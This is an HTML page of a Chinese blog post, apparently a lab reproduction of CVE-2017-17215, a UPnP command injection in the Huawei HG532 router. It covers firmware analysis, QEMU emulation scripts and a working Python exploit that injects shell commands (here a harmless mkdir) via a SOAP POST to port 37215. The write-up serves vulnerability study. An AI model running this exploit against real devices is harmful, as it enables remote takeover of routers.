@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言本文对 CVE-2017-17215 的复现过程进行了记录，该漏洞位于华为 HG532 路由器，在 UPnP 服务中存在 NewStatusURL 和 NewDownloadURL 标签中的命令注入。通过向端口 37215 ，地址为 &#x2F;ctrlt&#x2F;DeviceUpgrade_1 发送 POST 报文进行漏洞的触发。整体而言，这个漏洞确实是目前复现过最简单的了，但自己在做的时候依然踩了一些坑…�">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2017-17215复现（华为HG532命令执行）">
+<meta property="og:url" content="https://zikh26.github.io/posts/719b289c.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="前言本文对 CVE-2017-17215 的复现过程进行了记录，该漏洞位于华为 HG532 路由器，在 UPnP 服务中存在 NewStatusURL 和 NewDownloadURL 标签中的命令注入。通过向端口 37215 ，地址为 &#x2F;ctrlt&#x2F;DeviceUpgrade_1 发送 POST 报文进行漏洞的触发。整体而言，这个漏洞确实是目前复现过最简单的了，但自己在做的时候依然踩了一些坑…�">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252029497.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252030294.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251120088.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252011708.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252019907.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251325450.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252046935.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252054123.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252055156.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252058228.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252057621.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252111532.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252119217.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252125070.png">
+<meta property="article:published_time" content="2023-10-25T14:26:00.422Z">
+<meta property="article:modified_time" content="2023-10-25T14:35:54.192Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="MIPS架构">
+<meta property="article:tag" content="命令注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png">
+
+
+<link rel="canonical" href="https://zikh26.github.io/posts/719b289c.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/719b289c.html","path":"posts/719b289c.html","title":"CVE-2017-17215复现（华为HG532命令执行）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CVE-2017-17215复现（华为HG532命令执行） | ZIKH26's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">ZIKH26's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友链"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E9%93%BE%E6%8E%A5"><span class="nav-number">2.</span> <span class="nav-text">固件链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="nav-number">3.</span> <span class="nav-text">漏洞定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="nav-number">4.</span> <span class="nav-text">搭建复现环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%96%91%E9%97%AE"><span class="nav-number">6.</span> <span class="nav-text">疑问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZIKH26"
+      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+  <p class="site-author-name" itemprop="name">ZIKH26</p>
+  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">106</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">110</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/719b289c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26's Blog">
+      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CVE-2017-17215复现（华为HG532命令执行） | ZIKH26's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2017-17215复现（华为HG532命令执行）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-10-25 22:26:00 / 修改时间：22:35:54" itemprop="dateCreated datePublished" datetime="2023-10-25T22:26:00+08:00">2023-10-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/IOT%E5%AE%89%E5%85%A8/%E5%A4%8D%E7%8E%B0CVE/" itemprop="url" rel="index"><span itemprop="name">复现CVE</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文对 <code>CVE-2017-17215</code> 的复现过程进行了记录，该漏洞位于华为 <code>HG532</code> 路由器，在 <code>UPnP</code> 服务中存在 <code>NewStatusURL</code> 和 <code>NewDownloadURL</code> 标签中的命令注入。通过向端口 <code>37215</code> ，地址为 <code>/ctrlt/DeviceUpgrade_1</code> 发送 <code>POST</code> 报文进行漏洞的触发。整体而言，这个漏洞确实是目前复现过最简单的了，但自己在做的时候依然踩了一些坑…😅</p>
+<span id="more"></span>
+
+<h3 id="固件链接"><a href="#固件链接" class="headerlink" title="固件链接"></a>固件链接</h3><p>固件链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv">https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv</a><br>提取码：98uv</p>
+<h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>根据漏洞披露可知，在启动 <code>UPnP</code> 服务时，存在命令注入。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png" alt="image-20231025202359522"></p>
+<p>用 <code>binwalk</code> 将固件解压后，把文件系统中 <code>/bin</code> 目录下的 <code>UPnP</code> 程序给拷贝出来，使用 <code>IDA</code> 分析定位漏洞点时，我的思路是先对<code>system</code> 函数交叉引用看看，既然是命令注入，那大概率是 <code>snprintf + system</code> 造成的。</p>
+<p>在对 <code>system</code> 交叉引用到最后一个时，果然发现了漏洞点</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252029497.png" alt="image-20231025202940356"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252030294.png" alt="image-20231025203019229"></p>
+<p>这里把 <code>v4</code> <code>v5</code> 和正常字符串拼接后，直接执行了 <code>system</code> 命令，由于 <code>NewStatusURL</code> 和 <code>NewDownloadURL</code> 标签中的内容是用户可控，导致了命令注入漏洞</p>
+<h3 id="搭建复现环境"><a href="#搭建复现环境" class="headerlink" title="搭建复现环境"></a>搭建复现环境</h3><p>启动 <code>qemu</code> 之前，我是先执行 <code>net.sh</code> 脚本，创建了一个网桥并且设置了 <code>tap0</code> 接口留给 <code>qemu</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>qemu</code> 启动脚本如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我运行了启动脚本 <code>boot.sh</code> ，但发现一直没有回显，用 <code>ps -ef</code> 查看，发现是 <code>7069</code> 号进程卡住了</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251120088.png" alt="image-20231025112029984"></p>
+<p>经过反复尝试，将启动脚本里的 <code>vmlinux-2.6.32-5-5kc-malta</code> 改成 <code>vmlinux-2.6.32-5-4kc-malta</code> 就能成功把 <code>qemu</code> 给启起来（原因我也没搞明白，不知道是不是这个下载内核的版本影响）</p>
+<p>进入 <code>qemu</code> 后，首先执行 <code>ip add</code> 命令，确保能看到 <code>IP</code> 并可以正常和宿主机通信</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252011708.png" alt="image-20231025201126562"></p>
+<p>宿主机执行 <code>scp squashfs-root.tar.gz root@10.214.140.139:/root/</code> 命令，将解压的文件系统传入 <code>qemu</code> 中（传输前最好把文件夹给压缩一下，传入后再解压）</p>
+<p>提前用 <code>ssh</code> 再连一个到 <code>qemu</code> 上，后续执行程序 <code>mic</code> 时会把当前 <code>shell</code> 给卡住，所以先弄个 <code>ssh</code>（其实命令加上 <code>&amp;</code> 给它放到后台运行也没问题）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252019907.png" alt="image-20231025201917804"></p>
+<p>移动到刚传入的 <code>/root/squashfs-root</code> 目录，执行下面的命令来做出隔离环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 squashfs-root</span><br><span class="line">cd squashfs-root/</span><br><span class="line">mount --bind /proc proc</span><br><span class="line">mount --bind /dev dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>按照漏洞披露信息来看，需要先打开 <code>37215</code> 端口，并向该端口下的 <code> /ctrlt/DeviceUpgrade_1</code> 地址发送数据包。</p>
+<p>首先执行命令 <code>grep -r &quot;37215&quot; ./</code> ，查看字符串 <code>37215</code> 出现在了哪个文件里</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251325450.png" alt="image-20231025132521370"></p>
+<p>发现 <code>mic</code> 包含了字符串 <code>37215</code> ，猜测是该程序打开了 <code>37215</code> 端口，因此将 <code>mic</code> 运行</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252046935.png" alt="image-20231025204627701" style="zoom:50%;" />
+
+
+
+<p>执行一会发现这个 <code>ssh</code> 连上来的终端卡住了（刚刚的命令我都是在 <code>ssh</code> 上来的这个终端执行的），此时查看 <code>IP</code> ，发现网卡 <code>eth0</code> 的 <code>IP</code>  没了，网桥 <code>br0</code> 的 <code>IP</code> 被改成了 <code>192.168.1.1</code> ，也就导致 <code>ssh</code> 的连接断了。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252054123.png" alt="image-20231025205409991"></p>
+<p>执行 <code>ifconfig eth0 192.168.110.112/24 up</code> ，将网卡改回原本正常的 <code>IP</code> </p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252055156.png" alt="image-20231025205522011"></p>
+<p>宿主机执行 <code>ping</code> 命令，发现已经可以继续和 <code>qemu</code> 进行通信了（如果换回原本的 <code>IP</code> 还无法通信，<strong>确定一下虚拟机开的是不是桥接模式</strong>，我最开始用的是 <code>NAT</code> ，<code>IP</code> 改回正常的也依然无法通信，折腾了半天才发现要开桥接🥲）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252058228.png" alt="image-20231025205816128"></p>
+<p>在 <code>qemu</code> 中执行命令 <code>netstat -aut</code> 发现端口 <code>37215</code> 已经打开</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252057621.png" alt="image-20231025205747452"></p>
+<p>在宿主机上执行 <code>nmap -p- -Pn 192.168.110.112</code> ，对 <code>qemu</code> 开放的所有端口进行扫描，此时也能够看到 <code>37215</code> 成功的暴露了出来</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252111532.png" alt="image-20231025211157380" style="zoom:50%;" />
+
+
+
+<p>使用 <code>exp</code> 进行攻击验证，因为找了一下隔离环境中可用的命令，发现没有什么适合反弹 <code>shell</code> 的。这里就只用 <code>mkdir zikh26</code> 创建目录的命令来演示一下效果吧</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;;mkdir zikh26;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;mkdir ZIKH26;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.110.112:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行 <code>exp.py</code> 的时候，发现脚本卡住了，于是我手动 <code>ctrl+c</code> 给退出了</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252119217.png" alt="image-20231025211956983" style="zoom:50%;" />
+
+
+
+<p>第二次运行的时候还是卡住，然后我想着执行命令 <code>nmap -p- -Pn 192.168.110.112</code> 扫一下，确保端口还开着。结果扫了一下，<code>exp.py</code> 就正常执行了…😶‍🌫️</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252125070.png" alt="image-20231025212554572"></p>
+<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>漏洞在 <code>UPnP</code> 里，启动的是 <code>mic</code> 。那肯定是 <code>mic</code> 经过一系列调用后执行了 <code>UPnP</code> ，但是我看了一下 <code>mic</code> 里的字符串，以及 <code>UPnP</code> 字符串存在的那几个程序，并没有找到这之间的关系。因此这条漏洞链最终触发的完整细节我并没探究清楚，再加网上没有找到有文章对于这部分的分析，那就先……🥴</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">Huawei Home Routers in Botnet Recruitment - Check Point Research</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/384">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/486923010">HG532e漏洞复现(cve-2017-17215) - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/The54No1/article/details/129362750">HG532命令执行漏洞复现（CVE-2017-17215）_attifyos 密码-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/MIPS%E6%9E%B6%E6%9E%84/" rel="tag"># MIPS架构</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag"># 命令注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/9a31f2d.html" rel="prev" title="2023工业信息安全技能大赛—鹏城锦标赛复现-工控maze">
+                  <i class="fa fa-chevron-left"></i> 2023工业信息安全技能大赛—鹏城锦标赛复现-工控maze
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+
+</body>
+</html>
